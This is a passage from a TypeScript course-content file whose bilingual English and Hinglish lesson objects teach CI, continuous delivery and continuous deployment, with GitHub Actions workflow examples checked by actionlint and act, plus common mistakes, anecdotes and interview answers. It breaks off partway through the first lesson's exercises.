/**
 * DevOps Complete Course — Module 10: CI/CD Pipelines, lessons 1-3.
 *
 * Lesson 1: CI vs continuous delivery vs continuous deployment — precise
 *           definitions, the deployment pipeline, fail-fast ordering, the
 *           single path to production. VERIFIED (actionlint + act).
 * Lesson 2: Workflows, jobs, steps & the execution model — triggers, runners,
 *           the job DAG (`needs`), fresh-runner isolation, outputs, contexts,
 *           expressions, `if:`. VERIFIED (actionlint + act).
 * Lesson 3: Caching, artifacts, matrix & keeping CI fast — `actions/cache`,
 *           upload/download-artifact (build once), matrix + sharding,
 *           concurrency groups. VERIFIED (actionlint + act).
 */

import type { CourseLesson } from './course-js-module1';

export const DEVOPS_MODULE_10: CourseLesson[] = [
  {
    slug: 'ops-ci-cd-and-continuous-delivery-vs-deployment',
    title: 'CI, Continuous Delivery & Continuous Deployment',
    titleHi: 'CI, Continuous Delivery & Continuous Deployment',
    description: 'Three terms that get used interchangeably and are not the same. Continuous integration is merging to trunk often with an automated build and test on every push. Continuous delivery is keeping every green build releasable with a one-click deploy. Continuous deployment removes the click — every green build goes to production automatically.',
    descriptionHi: 'Teen terms jo interchangeably use hote hain aur same nahi hain. Continuous integration trunk mein baar-baar merge karna hai har push par ek automated build aur test ke saath. Continuous delivery har green build ko releasable rakhna hai ek one-click deploy ke saath. Continuous deployment click hata deta hai — har green build automatically production mein jaata hai.',
    difficulty: 'EASY',
    duration: 22,
    order: 1,

    analogy: {
      en: '**A factory assembly line with one conveyor belt to the loading dock.** Every part a worker finishes goes straight onto the shared belt (a commit to trunk), and the moment it lands, an automated station inspects it against the parts already there — does it still fit, does the assembly still work (**continuous integration**: build + test on every push). If a part fails inspection the belt stops right there, before the flaw travels any further (fail-fast). **Continuous delivery** is having the far end of the belt always loaded and a truck backed up to the dock, engine running — you could ship the current build at any second, it just takes someone to press the dispatch button. **Continuous deployment** wires the button to the inspection station: every unit that passes every check drives itself onto the truck and out the gate, no human in the loop. The belt, the stations, and their fixed order are the **deployment pipeline** — the one and only route from a worker\'s bench to a customer.',
      hi: '**Ek factory assembly line ek conveyor belt ke saath loading dock tak.** Har part jo ek worker khatam karta hai seedha shared belt par jaata hai (trunk mein ek commit), aur jis moment ye land karta hai, ek automated station ise pehle se wahaan ke parts ke against inspect karta hai — kya ye abhi bhi fit hota hai, kya assembly abhi bhi kaam karti hai (**continuous integration**: har push par build + test). Agar ek part inspection fail karta hai belt wahiN ruk jaata hai (fail-fast). **Continuous delivery** belt ke door ke end ko hamesha loaded rakhna hai aur ek truck dock par backed up, engine running — aap current build kisi bhi second ship kar sakte ho, bas kisi ko dispatch button dabana hai. **Continuous deployment** button ko inspection station se wire karta hai: har unit jo har check pass karti hai khud ko truck par drive karti hai, loop mein koi human nahi. Belt, stations, aur unka fixed order **deployment pipeline** hai.',
    },

    simple: `**THREE DISTINCT THINGS (people say "CI/CD" and mean different amounts of it):**
\`\`\`
CONTINUOUS INTEGRATION (CI)
  developers merge to TRUNK frequently (at least daily), and EVERY push triggers an
  automated: checkout -> build -> test. a broken build is the top priority to fix.
  goal: catch integration problems in minutes, not at a "merge week" months later.
  needs: trunk-based dev + a fast, reliable test suite + "don't build on a red trunk".

CONTINUOUS DELIVERY (CD)
  CI, PLUS: every build that passes is a RELEASABLE artifact, and deploying it to prod
  is ONE deliberate action (a button, a tag, a manual approval).
  you are always at most one click from a release. the decision to release is human;
  the mechanics are automated and boring.

CONTINUOUS DEPLOYMENT
  continuous delivery, MINUS the click: every commit that passes every stage is
  deployed to production automatically, no human gate.
  needs: strong automated tests + progressive rollout + fast automated rollback +
  good monitoring. this is a maturity level, not a starting point.
\`\`\`

**THE DEPLOYMENT PIPELINE** (Humble & Farley) — the single automated path from commit to prod:
\`\`\`
 commit -> [checkout] -> [build] -> [unit tests] -> [lint / static analysis / scan]
        -> [package ONE artifact] -> [integration / e2e tests] -> [deploy staging]
        -> [smoke tests] -> [deploy prod] -> [smoke tests]
\`\`\`
- **FAIL FAST**: cheap, fast stages first (lint, unit ~seconds) so a bad commit is
  rejected before the slow expensive stages (e2e, deploy) ever run.
- **BUILD ONCE**: the artifact built in the build stage is the *exact* one promoted to
  every environment. never rebuild per environment (Module 5, Module 11).
- **THE PIPELINE IS THE ONLY WAY TO PROD.** no side-door \`scp\`, no "quick manual fix on
  the server". if it's not in the pipeline it doesn't ship.

**CI vs CD is enabled by trunk-based development** (Module 4): short-lived branches, small
frequent merges, feature flags to hide unfinished work — so "the trunk is always green
and releasable" is actually true.`,

    simpleHi: `**TEEN ALAG CHEEZEN (log "CI/CD" kehte hain aur alag amounts ka matlab):**
\`\`\`
CONTINUOUS INTEGRATION (CI)
  developers TRUNK mein baar-baar merge karte hain (kam se kam daily), aur HAR push ek
  automated: checkout -> build -> test trigger karta hai. ek broken build fix karne ki top priority hai.
  goal: integration problems minutes mein catch karo, mahinon baad ek "merge week" par nahi.

CONTINUOUS DELIVERY (CD)
  CI, PLUS: har build jo pass hota hai ek RELEASABLE artifact hai, aur ise prod mein deploy
  karna EK deliberate action hai (ek button, ek tag, ek manual approval).
  aap hamesha ek release se at most ek click door ho. release ka decision human hai.

CONTINUOUS DEPLOYMENT
  continuous delivery, MINUS click: har commit jo har stage pass karta hai automatically
  production mein deploy hota hai, koi human gate nahi.
  needs: strong automated tests + progressive rollout + fast automated rollback + monitoring.
  ye ek maturity level hai, ek starting point nahi.
\`\`\`

**DEPLOYMENT PIPELINE** — commit se prod tak single automated path:
\`\`\`
 commit -> [checkout] -> [build] -> [unit tests] -> [lint / static analysis / scan]
        -> [package EK artifact] -> [integration / e2e tests] -> [deploy staging]
        -> [smoke tests] -> [deploy prod] -> [smoke tests]
\`\`\`
- **FAIL FAST**: sasti, tez stages pehle (lint, unit ~seconds) taaki ek bad commit slow
  expensive stages (e2e, deploy) ke chalne se pehle reject ho.
- **BUILD ONCE**: build stage mein bana artifact *exact* wahi hai jo har environment mein promoted hota hai.
- **PIPELINE HI PROD KA EKMATRA RAASTA HAI.** koi side-door \`scp\` nahi.

**CI vs CD trunk-based development se enabled hai** (Module 4): short-lived branches, chhote
frequent merges, feature flags.`,

    content: `## Why these words matter

"We do CI/CD" is said by teams that run tests on pull requests and by teams that ship to production forty times a day with no human involved. Those are very different capabilities, and the terms name specific points on that spectrum.

### Continuous integration

CI is a **practice**, not a tool. Its definition: every developer integrates their work into the shared mainline **frequently** — at least once a day, ideally many times — and **every integration is verified by an automated build and test run**. The point is to surface the pain of merging *continuously*, in small increments that are trivial to diagnose, instead of accumulating months of divergence and paying it all at once in an agonising "integration phase."

CI requires three things to actually work:

- **Trunk-based development** (Module 4) — short-lived branches merged within a day or two, so there is never a large gap between what you built and what everyone else built.
- **A fast, reliable test suite** — if the pipeline takes 40 minutes or fails randomly, developers stop trusting it and stop waiting for it, and CI is dead.
- **A team norm that a red mainline is an emergency** — you do not build new work on top of a broken build; fixing it comes first.

The automation — a server that checks out each push, builds it, and runs the tests — is necessary but is the *easy* part. The practice is the hard part.

### Continuous delivery

Continuous delivery adds a guarantee on top of CI: **every build that passes the pipeline is a deployable release candidate**, and getting it into production is a **single, low-drama action** — clicking a button, moving a tag, granting an approval. The software is always in a releasable state. Releasing is a *business* decision made by a human (timing, coordination, marketing), but the *mechanics* of releasing are fully automated, rehearsed on every commit against staging, and therefore boring and safe.

The test of whether you have continuous delivery: could you release the current commit right now, in a few minutes, with confidence, without a runbook full of manual steps? If not, you have CI but not CD.

### Continuous deployment

Continuous deployment removes the human gate: **every commit that passes every stage of the pipeline is deployed to production automatically**. No one clicks anything. This is a maturity level that depends on continuous delivery already being solid plus:

- A test suite trusted enough that "all green" genuinely means "safe to ship."
- **Progressive rollout** (canary, blue-green — Module 11) so a bad change reaches a fraction of traffic first.
- **Automated rollback** triggered by health signals, so a bad deploy is undone in seconds without a human.
- **Monitoring and alerting** good enough to catch what the tests missed.

Continuous deployment is a goal to grow into, not where a team starts. Continuous *delivery* — always releasable, one click away — is the right target for most teams.

## The deployment pipeline

Humble and Farley's *deployment pipeline* is the organising idea: a **single automated path** that every change travels from commit to production, broken into ordered stages, where a failure at any stage stops the change and reports why.

\`\`\`
commit
  -> checkout            get the exact source
  -> build / compile     produce binaries
  -> unit tests          fast, isolated - seconds
  -> lint / static analysis / dependency + secret scan
  -> package             build ONE immutable artifact (a container image, a jar, a zip)
  -> integration / e2e tests    slower - minutes
  -> deploy to staging   the same artifact
  -> smoke tests         is it alive and serving?
  -> deploy to production the same artifact
  -> smoke tests / health gate
\`\`\`

Three principles hold it together:

- **Fail fast.** Order stages cheapest-and-fastest first. Compilation and unit tests take seconds and catch most mistakes; run them before the ten-minute end-to-end suite and the deploy, so a typo is rejected in thirty seconds rather than after fifteen minutes of pipeline.
- **Build once, promote the same artifact.** The thing tested in the pipeline must be the *exact* thing that reaches production — same bytes, same digest. Rebuilding per environment means production runs something that was never tested. The build stage produces one artifact; every later stage consumes it (Modules 5 and 11).
- **The pipeline is the only road to production.** No copying a fixed file onto the server by hand, no "I'll just hotfix it live." Every change — including the emergency fix — goes through the same pipeline, because the pipeline is what makes changes safe and auditable.

## How trunk-based development enables all of this

CI's promise ("the mainline is always green") and CD's promise ("the mainline is always releasable") are only achievable if changes land on the mainline small and often. Long-lived feature branches break both: the branch diverges for weeks, the eventual merge is a big risky event, and in between the mainline does not contain the work being done so "releasable" is a fiction. Trunk-based development — branches that live a day or two, merged behind feature flags when the work spans longer — is the practice that makes continuous integration and continuous delivery mean something (Module 4).`,

    contentHi: `## Ye words kyun matter karte hain

"Hum CI/CD karte hain" un teams dwara kaha jaata hai jo pull requests par tests chalati hain aur un teams dwara jo bina kisi human ke din mein chalis baar production mein ship karti hain. Wo bahut alag capabilities hain.

### Continuous integration

CI ek **practice** hai, ek tool nahi. Iski definition: har developer apna kaam shared mainline mein **baar-baar** integrate karta hai — kam se kam din mein ek baar — aur **har integration ek automated build aur test run se verify hota hai**. Point merge ke dard ko *continuously* surface karna hai, chhote increments mein jo diagnose karne mein trivial hain.

CI ko actually kaam karne ke liye teen cheezein chahiye:
- **Trunk-based development** (Module 4) — short-lived branches ek ya do din mein merged.
- **Ek fast, reliable test suite** — agar pipeline 40 minute leta hai ya randomly fail hota hai, developers ise trust karna band kar dete hain, aur CI mar jaata hai.
- **Ek team norm ki ek red mainline ek emergency hai** — aap ek broken build ke upar naya kaam build nahi karte.

### Continuous delivery

Continuous delivery CI ke upar ek guarantee add karta hai: **har build jo pipeline pass karta hai ek deployable release candidate hai**, aur ise production mein laana ek **single, low-drama action** hai — ek button click karna, ek tag move karna, ek approval dena. Software hamesha ek releasable state mein hai. Release karna ek *business* decision hai jo ek human dwara banaya jaata hai, par release karne ki *mechanics* fully automated hai.

Test ki kya aapke paas continuous delivery hai: kya aap current commit ko abhi, kuch minutes mein, confidence ke saath release kar sakte ho, bina manual steps se bhare ek runbook ke? Agar nahi, aapke paas CI hai par CD nahi.

### Continuous deployment

Continuous deployment human gate hata deta hai: **har commit jo pipeline ke har stage pass karta hai automatically production mein deploy hota hai**. Ye ek maturity level hai jo continuous delivery ke pehle se solid hone plus par depend karta hai:
- Ek test suite jo itni trusted hai ki "all green" ka matlab genuinely "safe to ship."
- **Progressive rollout** (canary, blue-green — Module 11).
- **Automated rollback** health signals se triggered.
- **Monitoring aur alerting**.

Continuous deployment grow into karne ke liye ek goal hai, wahaan nahi jahaan ek team shuru karti hai.

## Deployment pipeline

Humble aur Farley ka *deployment pipeline*: ek **single automated path** jo har change commit se production tak travel karta hai, ordered stages mein toota, jahaan kisi bhi stage par ek failure change ko rok deta hai.

Teen principles ise saath rakhte hain:
- **Fail fast.** Stages ko cheapest-and-fastest pehle order karo. Compilation aur unit tests seconds lete hain; unhe das-minute end-to-end suite se pehle chalao.
- **Build once, same artifact promote karo.** Pipeline mein test kiya gaya cheez *exact* wahi hona chahiye jo production tak pahunchti hai.
- **Pipeline production ka ekmatra raasta hai.** Koi fixed file haath se server par copy nahi.

## Trunk-based development ye sab kaise enable karta hai

CI ka vaada aur CD ka vaada sirf tab achievable hain agar changes mainline par chhote aur often land karte hain. Long-lived feature branches dono ko todte hain.`,

    examples: [
      {
        title: 'CI: every push runs checkout → build → test, and test is the gate',
        titleHi: 'CI: har push checkout → build → test chalata hai, aur test gate hai',
        code: `# VERIFY
exec 2>&1
export PATH="$HOME/bin:$PATH"
git init -q; git config user.email ci@example.com; git config user.name ci; git config core.autocrlf false
mkdir -p .github/workflows
cat > .github/workflows/ci.yml <<'YAML'
name: CI
on:
  push:               # every push to any branch
  pull_request:       # and every PR
jobs:
  build-and-test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "step 1/3  npm ci        (install deps)"
      - run: echo "step 2/3  npm run build (compile)"
      - run: echo "step 3/3  npm test      (the gate - a failure here fails the whole run)"
YAML
git add -A >/dev/null; git commit -qm ci >/dev/null

echo "--- actionlint: static validation of the workflow ---"
actionlint -no-color 2>&1 | grep -E '\\.yml:' || echo "actionlint: no problems found"

echo "--- act: actually run the workflow in a container ---"
out=$(act push -P ubuntu-latest=node:20-bullseye-slim --pull=false 2>&1); rc=$?
echo "$out" | grep -oE 'step [0-9]/3  [^"]*' | sort -u
echo "workflow exit code: $rc  (0 = every step green -> the push is marked passed)"`,
        output: `--- actionlint: static validation of the workflow ---
actionlint: no problems found
--- act: actually run the workflow in a container ---
step 1/3  npm ci        (install deps)
step 2/3  npm run build (compile)
step 3/3  npm test      (the gate - a failure here fails the whole run)
workflow exit code: 0  (0 = every step green -> the push is marked passed)`,
        explain: 'A minimal continuous-integration workflow is written: it triggers on every push and every pull request, and its one job checks out the code, builds it, and runs the tests, in that order. The workflow is first checked statically by actionlint, which parses the YAML, validates it against the GitHub Actions schema, type-checks any expressions, and runs shellcheck over the run scripts — it reports no problems. Then act executes the workflow for real inside a Docker container, running each step in sequence, and the job succeeds. This is the whole of CI at the mechanical level: a definition that says "on every integration, do build then test," attached to the repository so it runs automatically. The third step is labelled the gate because if npm test exited non-zero the step would fail, the job would fail, and the push would be marked failed — which is the signal that stops a broken change from being treated as integrated. The practice of CI is the discipline around this automation: merging small and often so each run has little to check, and treating a red result as the thing to fix before anything else.',
        explainHi: 'Ek minimal continuous-integration workflow likha jaata hai: ye har push aur har pull request par trigger hota hai, aur iska ek job code checkout karta hai, ise build karta hai, aur tests chalata hai, us order mein. Workflow pehle actionlint dwara statically check hota hai, jo YAML parse karta hai, ise GitHub Actions schema ke against validate karta hai, kisi bhi expressions ko type-check karta hai, aur run scripts par shellcheck chalata hai — ye koi problems report nahi karta. Phir act workflow ko ek Docker container ke andar for real execute karta hai, har step sequence mein chalाकर, aur job succeed karta hai. Ye mechanical level par CI ka poora hai: ek definition jo kehti hai "har integration par, build phir test karo," repository se attached taaki ye automatically chale. Teesra step gate labelled hai kyunki agar npm test non-zero exit karta step fail hota, job fail hota, aur push failed mark hota.',
      },
      {
        title: 'Fail fast: a red test stops the pipeline before the deploy stage ever runs',
        titleHi: 'Fail fast: ek red test deploy stage ke chalne se pehle pipeline rok deta hai',
        code: `# VERIFY
exec 2>&1
export PATH="$HOME/bin:$PATH"
git init -q; git config user.email ci@example.com; git config user.name ci; git config core.autocrlf false
mkdir -p .github/workflows
cat > .github/workflows/pipeline.yml <<'YAML'
name: pipeline
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps: [ { run: 'echo "build: compiled OK"' } ]
  test:
    needs: build
    runs-on: ubuntu-latest
    steps: [ { run: 'echo "test: running suite..."; exit 1' } ]   # <-- a failing test
  deploy:
    needs: test
    runs-on: ubuntu-latest
    steps: [ { run: 'echo "deploy: SHIPPING TO PRODUCTION"' } ]
YAML
git add -A >/dev/null; git commit -qm ci >/dev/null

actionlint -no-color 2>&1 | grep -E '\\.yml:' || echo "actionlint: no problems found"
echo "--- act (the run fails; we capture what happened) ---"
out=$(act push -P ubuntu-latest=node:20-bullseye-slim --pull=false 2>&1); rc=$?
echo "$out" | grep -oE '(build: compiled OK|test: running suite\\.\\.\\.|deploy: SHIPPING TO PRODUCTION)' | sort -u
echo "workflow exit code: $rc  (non-zero: a stage failed)"
echo "deploy step executed? -> $(echo "$out" | grep -c 'deploy: SHIPPING TO PRODUCTION')  (0 = the pipeline stopped at the red stage)"`,
        output: `actionlint: no problems found
--- act (the run fails; we capture what happened) ---
build: compiled OK
test: running suite...
workflow exit code: 1  (non-zero: a stage failed)
deploy step executed? -> 0  (0 = the pipeline stopped at the red stage)`,
        explain: 'The pipeline has three jobs chained with needs: build, then test, then deploy. The test job runs a command that exits non-zero, standing in for a failing test. When act executes the workflow, build succeeds, test runs and fails, and deploy never starts at all — a job whose needs dependency failed is skipped. The final check greps the entire run output for the deploy job\'s marker string and finds zero occurrences, confirming that the code path which ships to production was never reached. This is fail-fast working as intended: the expensive, risky, irreversible stage is gated behind the cheap, fast stage that catches the mistake, so a broken commit is rejected before it can do any harm. The ordering is deliberate — putting the deploy first, or running the stages in parallel, would mean a bad build could reach production while its tests were still running. In a real pipeline the same structure has many more gates (lint, integration tests, security scans) each in front of deploy, and each one is a chance to stop a bad change cheaply.',
        explainHi: 'Pipeline ke teen jobs needs ke saath chained hain: build, phir test, phir deploy. Test job ek command chalata hai jo non-zero exit karta hai, ek failing test ke liye khada. Jab act workflow execute karta hai, build succeed karta hai, test chalta aur fail hota hai, aur deploy bilkul shuru nahi hota — ek job jiski needs dependency fail hui skip ho jaati hai. Final check poore run output ko deploy job ke marker string ke liye greps karta hai aur zero occurrences paata hai, confirm karke ki wo code path jo production mein ship karta hai kabhi reach nahi hua. Ye fail-fast intended ke roop mein kaam kar raha hai: expensive, risky, irreversible stage sasti, tez stage ke peeche gated hai jo mistake catch karta hai. Ordering deliberate hai — deploy ko pehle rakhna, ya stages ko parallel mein chalana, ka matlab ek bad build production tak pahunch sakta tha jabki iske tests abhi bhi run kar rahe the.',
      },
    ],

    mistakes: [
      {
        wrong: `# "we have CI/CD" = a workflow that runs tests on PRs, and deploys are still:
#   1. someone runs 'npm run build' on their laptop
#   2. scp the dist/ folder to the prod server
#   3. ssh in, 'pm2 restart', hope
# the tested thing (PR branch build) and the shipped thing (laptop build) are DIFFERENT
# builds. prod runs bytes that no pipeline ever saw. "it worked on my machine" at scale.`,
        right: `# CI is the test-on-every-push part. CD/continuous-delivery is the OTHER half:
#   - the pipeline PACKAGES one immutable artifact (container image w/ digest, or a
//     versioned tarball) as a stage, and stores it (registry / artifact store)
#   - deploy stages PULL THAT EXACT ARTIFACT and roll it out - no local builds, no scp
#   - deploying to prod is ONE action in the pipeline (a manual-approval job, a tag push)
#   - the emergency hotfix goes through the SAME pipeline (maybe a fast lane, same stages)
# now: tested bytes == shipped bytes, every deploy is identical and repeatable, and there
# is an audit trail of what shipped when and who approved it.`,
        why: 'Running an automated test suite on pull requests is continuous integration, and it is valuable, but it is only half of the picture. If the artifact that reaches production is built separately — on a developer\'s machine, or rebuilt in a different environment — then the thing the pipeline tested and the thing customers run are not the same build. Differences in local tool versions, uncommitted files, environment variables, and dependency resolution mean production can behave differently from everything that was verified, and the failure is invisible until it happens in production. Continuous delivery closes this by making the pipeline itself produce a single immutable artifact as an explicit stage, storing it in a registry or artifact repository, and having every deployment stage pull that exact artifact rather than building anew. Deploying to production becomes one controlled action within the pipeline — a manual approval, a tag — and even urgent fixes travel the same path. The result is that the bytes tested are the bytes shipped, every deployment is reproducible, and there is a record of what was released and who authorised it.',
        whyHi: 'Pull requests par ek automated test suite chalana continuous integration hai, aur ye valuable hai, par ye picture ka sirf aadha hai. Agar production tak pahunchne wala artifact separately build hota hai — ek developer ki machine par, ya ek alag environment mein rebuild — to jo cheez pipeline ne test ki aur jo cheez customers chalate hain wo same build nahi hain. Local tool versions, uncommitted files, environment variables mein differences ka matlab production har cheez se alag behave kar sakta hai jo verify kiya gaya tha. Continuous delivery ise band karta hai pipeline ko khud ek single immutable artifact ek explicit stage ke roop mein produce karvaकर, ise ek registry mein store karके, aur har deployment stage ko wo exact artifact pull karvाकर. Result ye hai ki test kiye gaye bytes ship kiye gaye bytes hain.',
      },
      {
        wrong: `# ordering the pipeline slowest-first (or all-parallel) "to get more signal"
jobs:
  e2e:        { runs-on: ubuntu-latest, steps: [...] }   # 12 minutes
  deploy-staging: { needs: e2e, ... }                     # 4 minutes
  unit:       { runs-on: ubuntu-latest, steps: [...] }    # 20 seconds, runs in PARALLEL
  lint:       { runs-on: ubuntu-latest, steps: [...] }    # 5 seconds,  runs in PARALLEL
# a commit with a syntax error now burns a 12-minute e2e run and a staging deploy
# before the 5-second lint job reports the typo. every red commit costs 16 minutes.`,
        right: `# fail fast: cheap + fast gates FIRST, expensive + slow gates BEHIND them:
jobs:
  lint:  { runs-on: ubuntu-latest, steps: [...] }          # ~5s
  unit:  { needs: lint, ... }                               # ~30s
  build: { needs: unit, ... }                               # ~1m
  e2e:   { needs: build, ... }                              # ~12m  - only if lint+unit+build pass
  deploy-staging: { needs: e2e, ... }
# (lint and unit CAN run in parallel with each other since both are cheap; the point is
#  nothing slow/expensive runs until the cheap checks are green.)
# a typo is now rejected in ~5 seconds, not 16 minutes.`,
        why: 'Pipeline stages differ enormously in cost and duration: a linter finishes in seconds, a unit suite in tens of seconds, an end-to-end suite in many minutes, and a deployment consumes real infrastructure. Most commits that fail do so for a simple reason a cheap stage would catch — a syntax error, a broken import, a failing unit test. If the slow and expensive stages run first, or all stages run in parallel, then every one of those simple failures still pays the full cost of the slow stages before the cheap stage reports the actual problem, wasting minutes of pipeline time and compute on each bad commit and slowing the feedback the developer needs. Ordering the pipeline so that the fastest, cheapest checks gate the slower, costlier ones means a bad commit is usually rejected in seconds. Cheap checks that are independent, such as linting and unit tests, can run in parallel with each other, but nothing slow or infrastructure-touching should start until the cheap checks are green.',
        whyHi: 'Pipeline stages cost aur duration mein bahut alag hote hain: ek linter seconds mein khatam hota hai, ek unit suite tens of seconds mein, ek end-to-end suite kai minutes mein, aur ek deployment real infrastructure consume karta hai. Zyadaatar commits jo fail hote hain ek simple reason se karte hain jo ek cheap stage catch karta — ek syntax error, ek broken import. Agar slow aur expensive stages pehle chalte hain, ya saare stages parallel mein chalte hain, to un simple failures mein se har ek abhi bhi slow stages ki full cost pay karta hai cheap stage ke actual problem report karne se pehle. Pipeline ko order karna taaki fastest, cheapest checks slower ko gate karein ka matlab ek bad commit usually seconds mein reject hota hai.',
      },
      {
        wrong: `# treating continuous DEPLOYMENT as the goal for a team that isn't ready
# team ships every green commit straight to prod, but:
#   - the test suite has ~15% coverage and 3 known flaky tests
#   - deploys are all-at-once (no canary), rollback is "revert + wait 10 min for CI"
#   - the only monitoring is "a customer emails us"
# result: bad changes reach 100% of users instantly, are noticed hours later by a human,
# and take 15+ minutes to roll back. every incident is a bad day.`,
        right: `# aim for continuous DELIVERY first (always releasable, one click away), and add the
# safety net BEFORE removing the human gate:
#   1. tests you actually trust (coverage of the risky paths, zero tolerated flakes)
#   2. progressive rollout - canary / blue-green (Module 11) so bad reaches ~1% first
#   3. automated rollback on health signals - undo in seconds, no human
#   4. monitoring/alerting that catches what tests miss, tied to the rollout
# THEN, per-service, remove the click. continuous deployment is earned, service by service.`,
        why: 'Continuous deployment — every green commit going to production with no human approval — only makes a system safer if the automation that replaces the human is at least as good at catching problems as the human was. That means a test suite whose green result is genuinely trustworthy, a rollout mechanism that exposes a new version to a small slice of traffic before the rest, an automated rollback that reacts to health metrics within seconds, and monitoring that surfaces regressions the tests did not cover. A team without those safeguards that removes the approval gate has simply made it faster for a bad change to reach every user, with the same slow, manual detection and recovery as before — so incidents become both more frequent and equally painful. The right progression is to first achieve continuous delivery, where the software is always in a releasable state and shipping is one deliberate action, then build the rollout, rollback, and monitoring safety net, and only then, service by service as confidence is earned, remove the manual step.',
        whyHi: 'Continuous deployment — har green commit bina human approval ke production mein jaana — ek system ko sirf tab safer banata hai agar wo automation jo human ko replace karta hai kam se kam human jitna acha problems catch karne mein hai. Iska matlab ek test suite jiska green result genuinely trustworthy hai, ek rollout mechanism jo ek naye version ko traffic ke ek chhote slice ko baaki se pehle expose karta hai, ek automated rollback jo health metrics par seconds ke andar react karta hai, aur monitoring. In safeguards ke bina ek team jo approval gate hata deti hai ne simply ise tez bana diya ek bad change ke har user tak pahunchne ke liye. Sahi progression pehle continuous delivery achieve karna hai, phir rollout, rollback, aur monitoring safety net build karna hai.',
      },
    ],

    realWorld: [
      {
        en: '**A "CI/CD" shop where prod ran a nightly build from a Jenkins box no one owned** — the pipeline tested PR branches, but releases were a manual `rsync` from that box. A drifted Node version on the box shipped a broken build; the tests had all been green. Fixed by packaging a container image in the pipeline and deploying only that digest.',
        hi: '**Ek "CI/CD" shop jahan prod ek Jenkins box se ek nightly build chalata tha jise koi own nahi karta tha** — pipeline PR branches test karti thi, par releases us box se ek manual `rsync` the. Pipeline mein ek container image package karके fix kiya.',
      },
      {
        en: '**Every failing commit cost 18 minutes** — the pipeline ran the 14-minute e2e suite and a staging deploy in parallel with the 40-second unit tests. Reordering to lint → unit → build → e2e → deploy cut the feedback time for a typo from 18 minutes to 25 seconds.',
        hi: '**Har failing commit 18 minute cost karta tha** — pipeline 14-minute e2e suite aur ek staging deploy ko 40-second unit tests ke parallel mein chalati thi. lint → unit → build → e2e → deploy par reorder karna.',
      },
      {
        en: '**A team turned on continuous deployment with 12% test coverage** — three months of Friday-afternoon incidents later, they added a canary stage (5% for 10 min, auto-rollback on error-rate) and a coverage gate on changed lines. Incident rate dropped ~80%; then they kept full continuous deployment.',
        hi: '**Ek team ne 12% test coverage ke saath continuous deployment on kiya** — teen mahine ke Friday-afternoon incidents baad, unhone ek canary stage add kiya aur changed lines par ek coverage gate.',
      },
    ],

    interviewQA: [
      {
        q: 'Define continuous integration, continuous delivery, and continuous deployment precisely, and say what each additionally requires.',
        qHi: 'Continuous integration, continuous delivery, aur continuous deployment ko precisely define karo.',
        a: 'Continuous integration is the practice of every developer merging their work into the shared mainline frequently, at least daily, with every merge verified by an automated build and test run. Its purpose is to expose integration problems continuously in small pieces rather than in a big painful merge later. It requires trunk-based development so branches do not diverge, a fast and reliable test suite so developers trust and wait for the result, and a team norm that a broken mainline is the top priority to fix. Continuous delivery adds a guarantee on top: every build that passes the pipeline is a releasable artifact, and deploying it to production is a single deliberate action such as a button or an approval. The software is always releasable; the decision to release is human but the mechanics are fully automated and rehearsed on every commit against staging. It requires the pipeline to package one immutable artifact and promote that same artifact through environments, plus a deploy process with no manual runbook steps. Continuous deployment removes the human gate entirely: every commit that passes every stage deploys to production automatically. It additionally requires a test suite trustworthy enough that green means safe, progressive rollout so a bad change hits a fraction of traffic first, automated rollback on health signals, and monitoring that catches what tests miss. Continuous deployment is a maturity level; continuous delivery is the right target for most teams.',
        aHi: 'Continuous integration har developer ke apna kaam shared mainline mein baar-baar merge karne ki practice hai, kam se kam daily, har merge ek automated build aur test run se verify hota hai. Iska purpose integration problems ko continuously chhote pieces mein expose karna hai. Ise trunk-based development chahiye, ek fast aur reliable test suite, aur ek team norm ki ek broken mainline fix karne ki top priority hai. Continuous delivery upar ek guarantee add karta hai: har build jo pipeline pass karta hai ek releasable artifact hai, aur ise production mein deploy karna ek single deliberate action hai. Ise pipeline ko ek immutable artifact package karna aur wahi artifact environments ke through promote karna chahiye. Continuous deployment human gate poori tarah hata deta hai. Ise additionally ek trustworthy test suite, progressive rollout, automated rollback, aur monitoring chahiye.',
      },
      {
        q: 'What is a deployment pipeline and what are the principles that make it work?',
        qHi: 'Ek deployment pipeline kya hai aur wo principles kya hain jo ise kaam karvaate hain?',
        a: 'A deployment pipeline is a single automated path that every change travels from commit to production, divided into ordered stages, where a failure at any stage halts the change and reports why. A typical pipeline is checkout, build, unit tests, static analysis and scanning, package into one artifact, integration and end-to-end tests, deploy to staging, smoke tests, deploy to production, smoke tests. Three principles make it work. Fail fast: order the stages so the cheapest and fastest run first, because most failures are simple things a linter or unit test catches in seconds, and there is no point spending twelve minutes on end-to-end tests and a staging deploy before a five-second check reports the typo. Build once and promote the same artifact: the exact bytes tested in the pipeline are the exact bytes deployed to every environment, identified by digest, so production never runs something that was rebuilt and therefore untested. The pipeline is the only road to production: no manually copying files to a server, no live hotfixes outside the pipeline, because the pipeline is what makes every change tested, repeatable, and auditable, and an exception for the urgent fix is exactly when that safety matters most.',
        aHi: 'Ek deployment pipeline ek single automated path hai jo har change commit se production tak travel karta hai, ordered stages mein divided, jahan kisi bhi stage par ek failure change ko halt karta hai. Ek typical pipeline checkout, build, unit tests, static analysis aur scanning, ek artifact mein package, integration aur end-to-end tests, staging mein deploy, smoke tests, production mein deploy hai. Teen principles ise kaam karvाते hain. Fail fast: stages ko order karo taaki cheapest aur fastest pehle chalein. Build once aur same artifact promote karo: pipeline mein test kiye gaye exact bytes har environment mein deploy kiye gaye exact bytes hain. Pipeline production ka ekmatra raasta hai: koi manually files server par copy nahi, pipeline ke bahar koi live hotfixes nahi.',
      },
    ],

    exercises: [
      {
        task: 'In a comment, define CI, continuous delivery, and continuous deployment, and list what each one needs beyond the previous.',
        taskHi: 'Ek comment mein, CI, continuous delivery, aur continuous deployment define karo.',
